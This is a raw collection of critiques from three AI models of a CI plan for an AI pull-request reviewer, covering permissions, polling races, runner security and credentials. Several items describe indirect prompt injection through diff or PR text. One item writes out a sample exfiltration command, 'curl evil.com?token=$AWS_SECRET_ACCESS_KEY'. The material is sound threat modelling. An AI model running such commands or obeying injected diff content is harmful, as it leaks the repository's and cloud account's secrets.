# DEBATE-RAW — Adversarial multi-model review of the advisory AI PR-review CI plan

Raw, unedited critiques from each external model. Synthesis lives in DEBATE-CONSOLIDATED.md.

---

## Critic 1 — GLM-5.2 (via pal__chat, temp 0.3, thinking=high) — RESPONDED

1. **`checks: read` missing from declared permissions.** Plan §2/§7 require polling the Checks API but YAML grants only `contents: read` + `pull-requests: write`. Polling step 403s immediately. Add `checks: read` (maybe `actions: read` if any `gh` subcommand hits the Actions API).

2. **`Bash(gh pr diff:*)` / `Bash(git diff:*)` is an indirect-prompt-injection → token-exfil vector and the allowlist is too broad.** Wildcards permit arbitrary flags; `gh` runs with `GITHUB_TOKEN` in env; untrusted *diff content* can steer a later Bash call. Fix: drop both Bash tools, pre-compute the diff in a controlled step and hand the model a file via `Read`; if Bash must stay, literal allowlist (no wildcard) and strip `GITHUB_TOKEN` from that tool's env.

3. **Polling has a real race: check-runs appear non-atomically.** (a) Creation race — a poll landing before a slow bot's check-run is even created cannot distinguish "not started" from "disabled"; a 5-min timeout means every temporarily-slow bot yields an empty skip-list → B duplicates A (the exact thing this exists to prevent). (b) `/commits/{ref}/check-runs` is eventually consistent — a just-`completed` run may lag in the list response. Fix: enumerate once, then poll each check-run by ID (`GET /check-runs/{id}`) until terminal; keep an explicit *expected-bots* list with a *shorter* sub-timeout (~60s) for "never appeared = disabled" vs the full 5-min only for runs that exist but aren't terminal. Document residual dup risk.

4. **`check_suite: completed` (open question §9) is the wrong signal.** Fires per-app-per-suite; no "all suites for this SHA done" event; you'd re-implement polling on top of it. Polling is the correct mechanism — keep it. There is no `workflow_run` to listen to because the bots aren't Actions workflows.

5. **Skip-list fetch conflates review-comments vs check-run summaries; different pagination + consistency.** Review comments paginate 30/100 per page; noisy PRs (where dedup matters most) truncate silently. CodeRabbit puts findings in the review-comment body, Cursor in the check-run summary AND inline. Mapping check-run→bot via `app.slug` is unstable. Fix: paginate both endpoints `per_page=100` + follow `Link`; pin bot identity by numeric `app.id`, not slug/login; treat check-run summaries as best-effort, inline comments as authoritative.

6. **`cancel-in-progress: true` can cancel mid-comment-edit, corrupting the "Resolved since last push" state.** The previous run's findings are never persisted, so the next run can't compute the resolved-diff. Fix: persist findings as a hidden JSON block inside the comment itself (read it back next run) — makes the comment self-contained and cancellation-resilient; or explicitly accept "Resolved" as best-effort.

7. **`fetch-depth: 0` is slow/unnecessary.** Full history every run. Use `fetch-depth: 2` + targeted `git fetch` of the base SHA, or sparse checkout.

8. **`thunder-severity` trailer is a *soft* gate even if not a technical one.** Humans anchor on "BLOCKING". The model emitting a misleading severity misleads reviewers. Fix: either drop the trailer or post-process/validate it against a rubric (a) is cleaner.

9. **`review_event: COMMENT` posts a *review* object, not an issue comment — but §5's find-by-marker→edit assumes an issue comment.** Reviews aren't editable via the issue-comments API. Verify exactly which API `claude-code-action@v1` uses; target the right object type. §5 hand-waves a real API distinction.

10. **Self-hosted runner + `pull_request` still checks out & can execute fork/PR-influenced content via Bash.** `pull_request` hides secrets from forks (good) but internal/branch PRs DO get `AWS_*`; a malicious insider/compromised branch can trick the model into exfiltrating via Bash. Fix: strip `AWS_*` from any Bash tool env; verify "send secrets to forked workflows" is off; strongly prefer an *ephemeral* runner over a persistent self-hosted foothold.

11. **No `timeout-minutes` on the job.** A hung model call / Bedrock outage holds the runner indefinitely. Add `timeout-minutes: 15`.

12. **"Resolved since last push" asks the model to parse its own previous markdown — unreliable** (rephrase/reorder/merge). Fix: store previous findings as hidden JSON in the comment; diff structurally; render markdown from the diff.

13. **`reopened` should behave like `opened`, not `synchronize`.** "Resolved since last push" is nonsense if last push was weeks ago. Detect `action == 'reopened'` and skip/relabel the Resolved section.

14. **No handling for skill / subagent not loading.** Wrong ref / missing file → action errors or silently does a generic review that ignores the whole architecture/dedup design. Add a pre-step that asserts the skill exists and fails loudly.

15. **Cost/latency: Opus-tier + deep mode on every push is expensive; `cancel-in-progress` doesn't refund spent model calls.** Rapid pushes burn budget on cancelled runs. Fix: debounce with a `sleep 60` at job start (cancellation during sleep costs nothing); gate deep mode behind diff-size AND a label.

16. **No backoff on GitHub 5xx.** Fixed 15s polling + 5xx storm burns secondary-rate-limit quota. Jittered exponential backoff (15s→60s); distinguish 4xx (bail) vs 5xx (retry).

17. **Long-lived `AWS_ACCESS_KEY_ID/SECRET` is an anti-pattern; use OIDC.** `aws-actions/configure-aws-credentials` with `role-to-assume`, IAM scoped to `bedrock:InvokeModel` on specific model ARNs. No static secret to exfiltrate.

---

## Critic 2 — Xiaomi MiMo (mimo-v2.5-pro, temp 0.3, thinking=high) — RESPONDED

1. **`checks: read` missing → polling 403s, mechanism dead on arrival.** Add it.

2. **Self-hosted runner + `pull_request` from forks = code execution on your infra.** Forks get no secrets but THE JOB STILL RUNS; checkout pulls fork HEAD (`fetch-depth: 0` grabs everything); attacker can read runner FS / pivot internal network / mine / DoS. "B doesn't run on forks" is FALSE — it runs with empty secrets. Fix: `if: github.event.pull_request.head.repo.full_name == github.repository`.

3. **`anthropics/claude-code-action@v1` is a mutable tag — supply-chain risk.** Compromised upstream can exfil `BEDROCK_AWS_*` via its own main/post scripts. Pin to full SHA + Dependabot/Renovate.

4. **AWS creds via step `env:` — every subprocess inherits them.** One `printenv | curl` from exfil if sandbox has a bug or action is compromised. Fix: OIDC `role-to-assume`, or scope creds to a step that doesn't run model-generated code.

5. **Compound of #1: no polling → B runs blind, before/concurrent with A.** SaaS bots have 30–90s webhook latency; "zero duplication" becomes fiction. Implement polling (needs `checks: read`) or rebase the plan's claims to best-effort.

6. **Check-runs eventual consistency:** a `completed` check-run doesn't guarantee its PR review comments are visible via REST yet (separate write paths). Add a post-terminal delay (~10–15s) or re-fetch comments until count stabilizes across 2 polls.

7. **No pagination in dedup fetch.** PR comments default 30/page (max 100); check-runs 30/page. CodeRabbit's 50+ comments silently truncate; the bot's check-run might be on page 2. Use `gh api --paginate` / follow `Link`.

8. **`cancel-in-progress: true` + idempotent comment → TOCTOU on the Resolved section / partial edits.** Two concurrent runs can read old comment and overwrite each other. Fix: single atomic `PATCH`; optimistic lock on `updated_at`/`node_id`.

9. **`fetch-depth: 0` expensive/unnecessary on self-hosted.** Use `fetch-depth: 1` or targeted base+head fetch.

10. **`gh pr diff` needs `GH_TOKEN`/`GITHUB_TOKEN`, not set in step env.** 401 unless the action sets it internally (undocumented dependency). Pass `GH_TOKEN: ${{ github.token }}` explicitly.

11. **Zero-findings case undefined.** Empty review? No comment? Absence is ambiguous (failed vs not-run vs clean). Always post "✅ No additional findings" so stakeholders can tell apart.

12. **`vars.THUNDER_REVIEW_MODEL` is mutable, no audit trail.** Settings-access user can silently change model behavior for every PR. Hardcode in YAML / committed config, or assert expected value.

13. **`cursor[bot]`/`coderabbitai[bot]` login strings assumed stable.** Bot logins can change (e.g. renovate precedent) → skip-list silently empties. Match `user.type == "Bot"` + pattern, or use app installation ID; add monitoring.

14. **Bash pattern enforcement is unaudited.** What stops `Bash(curl evil.com?token=$AWS_SECRET_ACCESS_KEY)`? Security wholly depends on the action's sandbox, which you haven't audited.

15. **`<!-- thunder-deep-review-summary -->` marker is trivially spoofable.** Anyone can put it in PR description/file/comment; if find-by-marker searches broadly the lifecycle is hijackable. Always combine marker + `author.type == "Bot"` + specific bot login.

16. **Self-hosted runner cleanup unspecified.** Persistent runners accumulate temp files / env leakage between jobs. Use a `container:` job or post-job cleanup hooks.

17. **No `timeout-minutes` on the job.** Looping/slow Bedrock runs forever, blocks runner, accrues cost. Add `timeout-minutes: 15`.

18. **Deep-mode cost gate unimplemented — fiscal policy delegated to the LLM.** Prompt just says "use the skill." Measure diff size in a pre-step and set config the skill reads; don't let the model self-regulate spend.

19. **Missing `edited` event** (PR title/description changes don't re-run). Probably intentional; document.

20. **`vars.AWS_REGION` no validation/fallback.** Unset → opaque "Unable to resolve region"; Opus availability varies by region. Validate early against an allowlist.

21. **No retry logic for transient failures** (Bedrock `ThrottlingException`, GitHub 5xx). Single-shot; quiet PR keeps the failure. Add exponential-backoff retries.

22. **Severity trailer in HTML comment is fragile to consume.** GitHub preserves it in raw `body` but any markdown-normalizing step destroys it. Use a structured JSON code block or check-run annotations.

23. **No CODEOWNERS guard on the workflow file.** Anyone with write access can edit the YAML to exfil secrets / change runner label / alter prompt. Add the workflow path to CODEOWNERS with a restricted owner set.

24. **"single issue comment (or review with event=COMMENT)" conflates two different objects — and you CANNOT edit a review body (no PATCH on Reviews API).** Edit-in-place requires issue comments (`POST .../issues/{n}/comments` + `PATCH .../issues/comments/{id}`). Reviews force delete+recreate, destroying reply threads. Decide definitively.

---

## Critic 3 — codex CLI (gpt-5.5, sandbox=read-only, reasoning=xhigh) — RESPONDED (direct CLI; clink wrapper failed on PATH). Findings are doc-cited against live GitHub docs.

1. **The workflow does not implement the design.** No poller, no skip-list fetch, no marker lookup, no edit-in-place, no resolved-state diff — it just runs Claude once. Fix: add explicit deterministic pre/post steps around the model, or the plan is fiction.

2. **`checks: read` missing.** Because `permissions:` is set, unspecified scopes default to `none`; the check-runs endpoint requires Checks:read. Add `checks: read`.

3. **Claude action inputs are stale.** `model` and `allowed_tools` are deprecated in `claude-code-action@v1`; `review_event` is NOT an action input at all. Fix: use `claude_args` (`--model`, `--allowedTools`) + `use_bedrock: "true"` + `use_sticky_comment: "true"`.

4. **Bedrock auth wrong for v1.** Action documents Bedrock via `use_bedrock: "true"` + OIDC, not static `AWS_ACCESS_KEY_ID/SECRET` env. Fix: `id-token: write` + `aws-actions/configure-aws-credentials` assuming a narrowly-scoped role; remove static keys.

5. **Fork PRs not actually blocked.** Secrets withheld but the job still schedules on the self-hosted runner without a job `if:`. Fix: `if: github.event.pull_request.head.repo.full_name == github.repository`. Also block/handle Dependabot (runs like a fork, no secrets).

6. **Self-hosted runner on PR code is a loaded gun.** GitHub: self-hosted runners can be *persistently* compromised by untrusted workflow code; almost never use for public repos. Fix: GitHub-hosted for untrusted PRs, or same-repo-only + ephemeral JIT runners, dedicated runner group, clean VM per job, no Docker socket, no cloud-metadata access, strict egress.

7. **Mutable action tags.** `actions/checkout@v4` and `claude-code-action@v1` can move. Pin every third-party action to a full commit SHA (only immutable option).

8. **`actions/checkout` persists the GitHub token by default** — model-controlled tool surface can run git in a repo with creds configured. Fix: `persist-credentials: false`.

9. **Head-SHA vs merge-ref mismatch.** On `pull_request`, `GITHUB_SHA` is the synthetic *merge* commit; PR head is `github.event.pull_request.head.sha`. Poll checks on head but review the merge commit → findings and A's checks describe different code. Fix: explicitly `ref: ${{ github.event.pull_request.head.sha }}` and poll the same SHA you check out.

10. **`pull_request` does not fire when the PR has merge conflicts** — advisory review vanishes exactly during risky rebases. Document the gap or add a metadata-only `pull_request_target` companion that never checks out fork code.

11. **"Terminal state" wording is wrong.** Check runs have `status: completed`; `failure`/`cancelled`/`timed_out` are *conclusions*, not statuses. Wait for `status == completed`, accept any conclusion.

12. **Polling by casual bot names is fragile** — names change, app slugs differ, apps create multiple runs, endpoint defaults to `filter=latest`. Fix: identify by `app.id`/`app.slug`, `check_name` only secondary, request `filter=all`, `per_page=100`, paginate.

13. **Checks API 1000-check-suite cliff** — GitHub caps check-runs for a ref to the 1000 most recent check suites. For noisy refs, list check *suites* first then list runs by `check_suite_id`.

14. **Pagination required everywhere** — review comments, issue comments, PR files, check runs default to 30, max 100. Use Octokit pagination / follow `Link`.

15. **Marker-comment lookup will duplicate on busy PRs** — if the marker is older than page 1 you won't find it and post another. Paginate all issue comments, or use the action's `use_sticky_comment`.

16. **"One consolidated post" not enforced** — `review_event: COMMENT` does nothing here; default action behavior isn't your marker lifecycle. Fix: make Claude emit structured output only, then render/update the single comment in your own Octokit step.

17. **Raw model markdown is unsafe output** — severity trailer spoofable, malformed output inevitable, PR text can prompt-inject the reviewer into @-mentioning users or leaking context. Fix: require JSON-schema output, validate severities against an enum, cap body length, render markdown deterministically.

18. **Concurrency ≠ transactional freshness** — ordering not guaranteed; a cancelled run can still reach a late post/edit. Fix: capture `head_sha` at start, re-verify PR head is still that SHA immediately before posting; embed `run_id` + `head_sha` in the marker; stale runs exit.

19. **"Resolved since last push" state under-specified** — if a run fails/cancels/posts partially, the next previous-vs-current diff lies. Fix: store machine-readable prior findings as a hidden JSON block keyed by stable finding-hashes + reviewed head SHA; update only after a successful render.

20. **15s polling across PRs is a rate-limit tax** — `GITHUB_TOKEN` = 1000 REST req/hr/repo; secondary limits hit concurrent/same-endpoint bursts. Prefer `check_suite`/`check_run` events where possible; else exponential backoff + jitter, conditional requests, rate-limit-header handling.

21. **Comment create/edit can trip abuse limits** — GitHub explicitly warns creating issue/PR comments too quickly triggers secondary limits. Don't post "no findings" churn, edit only when content changed, honor `Retry-After`, collapse to one mutating request.

22. **"Huge diff" ignores the hard API edge** — PR files responses cap at 3000 files. Detect file-count/truncation early and switch to a bounded review mode instead of pretending full coverage.

23. **Dedup key `{file,line,body}` is junk** — review comments have `side`, `start_line`, `original_line`, `commit_id`, `original_commit_id`, `diff_hunk`; lines drift on force-push. Normalize against diff hunks; include side/range/original-commit fields.

24. **Inline comments need diff positions, not file lines** — if you ever switch to inline comments, naive `file,line` posting 422s (`position` != file line number).

25. **`fetch-depth: 0` is lazy and expensive** — fetch only base/head SHAs, or generate the diff outside the model and pass a bounded artifact.

26. **Secrets exposed to the whole third-party action step** — actions can access `github.token` even when not explicitly passed; third-party compromise leaks secrets. Fix: no static cloud secrets (OIDC only), minimal `GITHUB_TOKEN`, no debug/full-output flags, render comments outside the model step.

27. **The 5-min "bot disabled" timeout is recurring waste** — if a bot isn't installed, every push burns runner minutes first. Maintain an explicit enabled-bots config, or wait only if the check appears within a short discovery window.

28. **No `timeout-minutes` set** — "cap runner time" isn't implemented. Set job + step timeouts plus Claude `--max-turns`.

29. **Trigger coverage incomplete** — missing `ready_for_review` and base-branch changes via `edited`; should skip drafts. Add `ready_for_review`/`edited` and `if: github.event.pull_request.draft == false`.

30. **"Zero content overlap" is an impossible guarantee** — a prompt-level skip-list is not a dedup system. Call it best-effort, pre-filter known A findings deterministically, accept humans will still see occasional dupes.
